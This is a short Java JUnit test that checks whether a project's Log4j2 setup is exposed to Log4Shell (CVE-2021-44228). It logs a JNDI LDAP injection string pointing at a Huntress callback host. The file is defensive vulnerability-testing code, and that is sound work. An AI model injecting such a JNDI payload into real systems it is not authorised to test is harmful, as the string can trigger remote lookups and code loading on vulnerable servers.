package info.setmy.cve;

import org.junit.Test;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.junit.jupiter.api.Disabled;

public class LoggingProblemTest {

    final Logger log = LogManager.getLogger(this.getClass());

    private final String PAYLOAD = "${jndi:ldap://log4shell.huntress.com:1389/e327d2af-38cf-4750-8ee7-43b0c725a62e}";

    /**
     * Run manually.
     *
     * 1. Get new LDAP URL from huntress as PAYLOAD. 2. Run test. 3. Check
     * huntress result page - that should be empty.
     *
     * To be sure, it is testing change Log4j2 librari version to 2.14.1. DONT
     * FORGET change back!
     */
    @Test
    @Disabled // Run manually. Get new LDAP URL from huntress, run test, check IP result list from huntress.
    public void logging() {
        // CVE-2021-44228 : https://log4shell.huntress.com/
        log.info("CVE-2021-44228");
        log.info(PAYLOAD);
    }
}
